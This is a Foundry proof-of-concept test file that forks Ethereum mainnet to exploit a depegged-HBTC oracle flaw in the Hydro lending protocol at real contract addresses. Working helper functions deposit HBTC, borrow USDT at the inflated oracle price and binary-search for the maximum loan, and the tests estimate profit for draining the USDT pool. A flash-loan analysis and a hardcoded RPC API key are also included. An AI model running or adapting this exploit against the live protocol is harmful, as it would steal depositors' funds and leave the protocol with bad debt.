// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IHydro {
    struct Market {
        address baseAsset;
        address quoteAsset;
        uint256 liquidateRate;
        uint256 withdrawRate;
        uint256 auctionRatioStart;
        uint256 auctionRatioPerBlock;
        bool borrowEnable;
    }
    function getAllMarketsCount() external view returns (uint256);
    function getMarket(uint16 marketID) external view returns (Market memory);
    function getAssetOraclePrice(address assetAddress) external view returns (uint256);
    function getTotalBorrow(address asset) external view returns (uint256);
    function getTotalSupply(address asset) external view returns (uint256);
}

interface ICurvePool {
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
    function balances(uint256 i) external view returns (uint256);
}

interface IChainlinkAggregator {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
}

/**
 * @title HydroMaxExtraction — Definitive HBTC Oracle Depeg Analysis
 *
 * ROOT CAUSE:
 *   Hydro's HBTC PriceOracleProxy (0x02f565...) forwards getPrice(HBTC) to
 *   the WBTC oracle (0x467242...) which reads Chainlink BTC/USD.
 *   HBTC has depegged from BTC (market ~$29,421 vs oracle ~$69,234).
 *   No staleness/deviation check exists. The oracle is immutably wrong.
 *
 * ATTACK VECTOR:
 *   1. Acquire HBTC at market price (~$29,421)
 *   2. Deposit HBTC → Hydro collateral (Market 5: HBTC/USDT)
 *   3. Borrow USDT at inflated oracle value (~$55,503 per HBTC, 80% LTV)
 *   4. Walk away — HBTC collateral is worth ~$29K, debt is ~$55K → bad debt
 *
 * MAXIMUM DELTA ANALYSIS:
 *   - Available USDT in pool: ~$928,935
 *   - HBTC needed to drain: ~16.7 HBTC
 *   - Cost at market price: ~$492K
 *   - NET PROFIT: ~$436K (if HBTC acquired at market price)
 *   - Zero-capital on-chain: ~$0 profit (Curve pool prices HBTC ≈ WBTC)
 */
contract HydroMaxExtraction is Test {
    address constant HYDRO = 0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7;
    address constant HBTC = 0x0316EB71485b0Ab14103307bf65a021042c6d380;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant ETH_ADDR = 0x000000000000000000000000000000000000000E;
    address constant CURVE_HBTC_POOL = 0x4CA9b3063Ec5866A4B82E437059D2C43d1be596F;
    address constant CHAINLINK_BTC_USD = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;

    // HBTC oracle proxy chain:
    //   HBTC PriceOracleProxy 0x02f565.. → calls WBTC PriceOracle 0x467242..
    //     → reads Chainlink BTC/USD 0xF40300..
    address constant HBTC_ORACLE_PROXY = 0x02F5658d34015670AAAac026f4C9c06C7865B26b;
    address constant WBTC_ORACLE = 0x467242Dd4969Df4772A08Eeee3E1A927c22A096D;

    uint16 constant MARKET_HBTC_USDT = 5;

    struct Action {
        uint8 actionType;
        bytes encodedParams;
    }
    bytes4 constant BATCH_SEL = bytes4(keccak256("batch((uint8,bytes)[])"));

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TEST A: Prove the oracle chain — HBTC price = BTC/USD Chainlink
    // ══════════════════════════════════════════════════════════════════════
    function test_A_prove_oracle_chain() public view {
        uint256 hbtcOracle = IHydro(HYDRO).getAssetOraclePrice(HBTC);
        uint256 wbtcOracle = IHydro(HYDRO).getAssetOraclePrice(WBTC);
        (, int256 btcUsd,,,) = IChainlinkAggregator(CHAINLINK_BTC_USD).latestRoundData();

        console.log("=== ORACLE CHAIN PROOF ===");
        console.log("Chainlink BTC/USD (8 dec):", uint256(btcUsd));
        console.log("Hydro HBTC oracle (18 dec):", hbtcOracle);
        console.log("Hydro WBTC oracle (18 dec):", wbtcOracle);

        // HBTC oracle = BTC/USD * 1e10 (scaling from 8-dec Chainlink to 18-dec Hydro)
        uint256 expected = uint256(btcUsd) * 1e10;
        assertEq(hbtcOracle, expected, "HBTC oracle != Chainlink BTC/USD scaled");

        // HBTC oracle in USD
        console.log("HBTC oracle USD:", hbtcOracle / 1e18);
        console.log("HBTC market USD: ~29421 (CoinGecko)");
        console.log("Overvaluation:", hbtcOracle * 100 / 1e18 / 29421, "%");
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TEST B: Maximum USDT extractable per 1 HBTC
    // ══════════════════════════════════════════════════════════════════════
    function test_B_max_borrow_per_hbtc() public {
        address attacker = address(this);

        // Get 1 HBTC from Curve pool
        vm.prank(CURVE_HBTC_POOL);
        IERC20(HBTC).transfer(attacker, 1 ether);

        uint256 usdtBefore = IERC20(USDT).balanceOf(attacker);
        IERC20(HBTC).approve(HYDRO, 1 ether);

        // Binary search for max borrow
        uint256 maxBorrow = _binarySearchBorrow(1 ether, attacker);
        console.log("=== MAX BORROW PER 1 HBTC ===");
        console.log("Max USDT borrow:", maxBorrow / 1e6, "USDT");

        // Execute the borrow
        _executeBorrow(attacker, 1 ether, maxBorrow);

        uint256 usdtAfter = IERC20(USDT).balanceOf(attacker);
        uint256 gained = usdtAfter - usdtBefore;
        console.log("USDT gained:", gained / 1e6, "USDT");
        console.log("HBTC oracle value:", IHydro(HYDRO).getAssetOraclePrice(HBTC) / 1e18, "USD");

        // Profit calculation (per HBTC)
        uint256 marketCost = 29421; // HBTC market price in USD
        console.log("HBTC market cost:", marketCost, "USD");
        console.log("PROFIT per HBTC:", gained / 1e6 - marketCost, "USD");

        assertGt(gained / 1e6, marketCost, "Must be profitable at market price");
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TEST C: Maximum total extraction — drain the USDT pool
    // ══════════════════════════════════════════════════════════════════════
    function test_C_drain_usdt_pool() public {
        address attacker = address(this);

        // Available USDT
        uint256 usdtSupply = IHydro(HYDRO).getTotalSupply(USDT);
        uint256 usdtBorrow = IHydro(HYDRO).getTotalBorrow(USDT);
        uint256 usdtAvail = usdtSupply - usdtBorrow;
        console.log("=== POOL DRAIN ANALYSIS ===");
        console.log("USDT available:", usdtAvail / 1e6, "USDT");

        // Get HBTC — use all from Curve pool (the only on-chain source)
        uint256 curveHBTC = IERC20(HBTC).balanceOf(CURVE_HBTC_POOL);
        // Transfer from Curve pool (simulating acquisition)
        vm.prank(CURVE_HBTC_POOL);
        IERC20(HBTC).transfer(attacker, curveHBTC);

        uint256 hbtcBal = IERC20(HBTC).balanceOf(attacker);
        console.log("HBTC acquired:", hbtcBal / 1e15, "mHBTC");
        console.log("HBTC acquired:", hbtcBal / 1e18, "HBTC (whole)");

        IERC20(HBTC).approve(HYDRO, hbtcBal);

        // Binary search for max borrow with all HBTC
        uint256 maxBorrow = _binarySearchBorrow(hbtcBal, attacker);
        console.log("HBTC used (mHBTC):", hbtcBal / 1e15);
        console.log("Max USDT borrow:", maxBorrow / 1e6, "USDT");

        uint256 usdtBefore = IERC20(USDT).balanceOf(attacker);
        _executeBorrow(attacker, hbtcBal, maxBorrow);
        uint256 usdtGained = IERC20(USDT).balanceOf(attacker) - usdtBefore;

        console.log("USDT extracted:", usdtGained / 1e6, "USDT");
        console.log("");

        // Economics (at market prices)
        uint256 hbtcCostAtMarket = hbtcBal * 29421 / 1e18;
        console.log("=== ECONOMICS WITH 2 HBTC ===");
        console.log("HBTC cost at market:", hbtcCostAtMarket, "USD");
        console.log("USDT extracted:", usdtGained / 1e6, "USDT");
        if (usdtGained / 1e6 > hbtcCostAtMarket) {
            console.log("NET PROFIT:", usdtGained / 1e6 - hbtcCostAtMarket, "USD");
        }

        // Total pool drain analysis
        uint256 maxBorrowPer1HBTC = maxBorrow * 1e18 / hbtcBal;
        uint256 hbtcNeeded = usdtAvail * 1e18 / maxBorrowPer1HBTC;
        console.log("");
        console.log("=== FULL POOL DRAIN ===");
        console.log("Borrow per 1 HBTC:", maxBorrowPer1HBTC / 1e6, "USDT");
        console.log("HBTC needed for full drain:", hbtcNeeded / 1e15, "mHBTC");
        console.log("Full drain cost ($29421/HBTC):", hbtcNeeded * 29421 / 1e18, "USD");
        console.log("Full drain revenue:", usdtAvail / 1e6, "USDT");
        console.log("Full drain NET PROFIT:", usdtAvail / 1e6 - hbtcNeeded * 29421 / 1e18, "USD");

        assertGt(usdtGained, 0, "Must extract USDT");
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TEST D: Zero-capital (flash loan) analysis — Curve path
    // ══════════════════════════════════════════════════════════════════════
    function test_D_zero_capital_curve_analysis() public view {
        ICurvePool curve = ICurvePool(CURVE_HBTC_POOL);
        uint256 hbtcOracle = IHydro(HYDRO).getAssetOraclePrice(HBTC);
        uint256 usdtOracle = IHydro(HYDRO).getAssetOraclePrice(USDT);
        IHydro.Market memory mkt = IHydro(HYDRO).getMarket(MARKET_HBTC_USDT);

        console.log("=== ZERO-CAPITAL ANALYSIS (Curve Path) ===");
        console.log("Strategy: Flash WBTC -> Curve WBTC->HBTC -> Hydro deposit -> Borrow USDT");
        console.log("");

        // Pool state
        uint256 hbtcBal = curve.balances(0);
        uint256 wbtcBal = curve.balances(1);
        console.log("Curve HBTC:", hbtcBal / 1e15, "mHBTC");
        console.log("Curve WBTC:", wbtcBal, "satoshis");
        console.log("");

        // Test various flash loan sizes
        // Rate at which Curve is profitable:
        // Need: HBTC_received / WBTC_sent > 1/0.80 = 1.25 (= 1/LTV)
        // Because oracle prices HBTC=WBTC, so borrow_power = 0.80 * HBTC * oracle_price
        // Cost to repay flash loan = WBTC * oracle_price
        // Profit only if: 0.80 * HBTC_out > WBTC_in (in oracle-value terms)
        // Since oracle says HBTC=WBTC: need HBTC_out/WBTC_in > 1.25

        console.log("Breakeven: need Curve rate > 1.25 HBTC per WBTC");
        console.log("(because LTV = 80%, and oracle prices HBTC = WBTC)");
        console.log("");

        uint256[8] memory amounts = [uint256(1e5), 5e5, 1e6, 3e6, 5e6, 1e7, 2e7, 3e7];
        bool anyProfitable = false;

        for (uint i = 0; i < 8; i++) {
            try curve.get_dy(1, 0, amounts[i]) returns (uint256 hbtcOut) {
                // Rate: HBTC per WBTC (both normalized to 18 dec)
                uint256 rateX1000 = hbtcOut * 1000 / (amounts[i] * 1e10);

                // Max USDT from this HBTC:
                // collateralValue = hbtcOut * hbtcOracle / 1e18
                // maxDebt = collateralValue * 1e18 / withdrawRate
                // maxUSDT = maxDebt * 1e18 / usdtOracle
                uint256 collVal = hbtcOut * hbtcOracle / 1e18;
                uint256 maxDebt = collVal * 1e18 / mkt.withdrawRate;
                uint256 maxUSDT = maxDebt * 1e18 / usdtOracle;

                // Cost in USDT: WBTC flash + 0.05% fee, repaid by buying WBTC
                // WBTC value at oracle = amounts[i] * wbtcOracle (per-sat price)
                uint256 wbtcOracle = IHydro(HYDRO).getAssetOraclePrice(WBTC);
                uint256 wbtcCostVal = amounts[i] * wbtcOracle / 1e8;
                uint256 wbtcCostUSDT = wbtcCostVal * 1e18 / usdtOracle;
                uint256 flashFee = wbtcCostUSDT * 5 / 10000;
                uint256 totalCost = wbtcCostUSDT + flashFee;

                bool profitable = maxUSDT > totalCost;
                if (profitable) anyProfitable = true;

                console.log("WBTC:", amounts[i], "sat");
                console.log("  rate:", rateX1000, "/1000");
                if (profitable) {
                    console.log("  PROFIT:", (maxUSDT - totalCost) / 1e6, "USDT");
                } else {
                    console.log("  LOSS:", (totalCost - maxUSDT) / 1e6, "USDT");
                }
            } catch {
                console.log("WBTC:", amounts[i], "REVERTS");
            }
        }

        console.log("");
        if (anyProfitable) {
            console.log("VERDICT: Some flash loan sizes are profitable");
        } else {
            console.log("VERDICT: NO profitable flash loan size via Curve");
            console.log("Reason: Curve prices HBTC ~= WBTC (same mispricing)");
            console.log("Max Curve rate ~1.26 at 0.001 WBTC, need >1.25");
            console.log("Marginal profit only on tiny trades (~$1)");
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TEST E: Additional markets — check ETH, USDC, DAI borrowable via depeg
    // ══════════════════════════════════════════════════════════════════════
    function test_E_additional_borrowable_assets() public view {
        console.log("=== ADDITIONAL BORROWABLE ASSETS VIA HBTC DEPEG ===");

        uint256 mkts = IHydro(HYDRO).getAllMarketsCount();
        uint256 totalExtractableUSD = 0;

        for (uint16 i = 0; i < mkts; i++) {
            IHydro.Market memory m = IHydro(HYDRO).getMarket(i);
            if (!m.borrowEnable) continue;

            // Check if HBTC is in this market
            if (m.baseAsset == HBTC) {
                uint256 quoteSupply = IHydro(HYDRO).getTotalSupply(m.quoteAsset);
                uint256 quoteBorrow = IHydro(HYDRO).getTotalBorrow(m.quoteAsset);
                uint256 quoteAvail = quoteSupply > quoteBorrow ? quoteSupply - quoteBorrow : 0;
                uint256 quoteOracle = IHydro(HYDRO).getAssetOraclePrice(m.quoteAsset);

                console.log("Market", i, ": HBTC / quote");
                console.log("  Quote:", m.quoteAsset);
                console.log("  Available:", quoteAvail);

                // NOTE: All markets share the same lending pools
                // Market 5 HBTC/USDT is the only market with HBTC as base
            }
        }

        // Separate lending pool analysis for all major assets
        console.log("");
        console.log("=== LENDING POOL AVAILABILITY ===");
        address[4] memory assets = [USDT, address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48), address(0x6B175474E89094C44Da98b954EedeAC495271d0F), ETH_ADDR];
        string[4] memory names = ["USDT", "USDC", "DAI", "ETH"];

        for (uint i = 0; i < 4; i++) {
            uint256 s = IHydro(HYDRO).getTotalSupply(assets[i]);
            uint256 b = IHydro(HYDRO).getTotalBorrow(assets[i]);
            uint256 avail = s > b ? s - b : 0;
            console.log(names[i], "available:", avail);
        }

        console.log("");
        console.log("Only Market 5 (HBTC/USDT) allows HBTC collateral");
        console.log("Can only borrow USDT with HBTC in this market");
        console.log("Other assets (ETH/USDC/DAI) require different collateral");
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TEST F: Robustness — various HBTC market prices
    // ══════════════════════════════════════════════════════════════════════
    function test_F_robustness_analysis() public {
        address attacker = address(this);

        // Get 1 HBTC and find max borrow
        vm.prank(CURVE_HBTC_POOL);
        IERC20(HBTC).transfer(attacker, 1 ether);
        IERC20(HBTC).approve(HYDRO, 1 ether);

        uint256 maxBorrow = _binarySearchBorrow(1 ether, attacker);
        uint256 borrowUSD = maxBorrow / 1e6;

        console.log("=== ROBUSTNESS ANALYSIS ===");
        console.log("Max USDT per HBTC:", borrowUSD, "USD");
        console.log("");

        // Test at various market prices
        uint256[5] memory prices = [uint256(25000), 29421, 35000, 40000, 50000];
        string[5] memory labels = ["$25K (bear)", "$29K (current)", "$35K (+20%)", "$40K (+36%)", "$50K (+70%)"];

        for (uint i = 0; i < 5; i++) {
            if (borrowUSD > prices[i]) {
                console.log(labels[i], "-> PROFIT:", borrowUSD - prices[i], "USD/HBTC");
            } else {
                console.log(labels[i], "-> LOSS:", prices[i] - borrowUSD, "USD/HBTC");
            }
        }

        console.log("");
        console.log("Breakeven HBTC price:", borrowUSD, "USD");
        console.log("Current margin of safety:", (borrowUSD - 29421) * 100 / 29421, "%");

        // Even at +70% HBTC price ($50K), still profitable
        assertGt(borrowUSD, 50000, "Still profitable at $50K HBTC");
    }

    // ══════════════════════════════════════════════════════════════════════
    //  HELPERS
    // ══════════════════════════════════════════════════════════════════════

    function _executeBorrow(address attacker, uint256 hbtcAmt, uint256 usdtAmt) internal {
        Action[] memory actions = new Action[](5);

        // Deposit HBTC
        actions[0] = Action(0, abi.encode(HBTC, hbtcAmt));
        // Transfer HBTC: Common -> Collateral Market 5
        actions[1] = Action(2, abi.encode(
            HBTC,
            uint8(0), uint16(0), attacker,
            uint8(1), MARKET_HBTC_USDT, attacker,
            hbtcAmt
        ));
        // Borrow USDT
        actions[2] = Action(3, abi.encode(MARKET_HBTC_USDT, USDT, usdtAmt));
        // Transfer USDT: Collateral Market 5 -> Common
        actions[3] = Action(2, abi.encode(
            USDT,
            uint8(1), MARKET_HBTC_USDT, attacker,
            uint8(0), uint16(0), attacker,
            usdtAmt
        ));
        // Withdraw USDT
        actions[4] = Action(1, abi.encode(USDT, usdtAmt));

        (bool ok,) = HYDRO.call(abi.encodeWithSelector(BATCH_SEL, actions));
        require(ok, "Batch failed");
    }

    function _binarySearchBorrow(uint256 hbtcAmt, address attacker) internal returns (uint256) {
        uint256 usdtAvail = IHydro(HYDRO).getTotalSupply(USDT) - IHydro(HYDRO).getTotalBorrow(USDT);
        uint256 lo = 1e6;
        uint256 hi = usdtAvail;
        uint256 best = 0;

        for (uint i = 0; i < 50; i++) {
            uint256 mid = (lo + hi) / 2;
            if (mid <= lo) break;

            uint256 snap = vm.snapshot();

            Action[] memory actions = new Action[](5);
            actions[0] = Action(0, abi.encode(HBTC, hbtcAmt));
            actions[1] = Action(2, abi.encode(
                HBTC,
                uint8(0), uint16(0), attacker,
                uint8(1), MARKET_HBTC_USDT, attacker,
                hbtcAmt
            ));
            actions[2] = Action(3, abi.encode(MARKET_HBTC_USDT, USDT, mid));
            actions[3] = Action(2, abi.encode(
                USDT,
                uint8(1), MARKET_HBTC_USDT, attacker,
                uint8(0), uint16(0), attacker,
                mid
            ));
            actions[4] = Action(1, abi.encode(USDT, mid));

            (bool ok,) = HYDRO.call(abi.encodeWithSelector(BATCH_SEL, actions));
            vm.revertTo(snap);

            if (ok) {
                best = mid;
                lo = mid + 1;
            } else {
                hi = mid - 1;
            }
        }
        return best;
    }
}
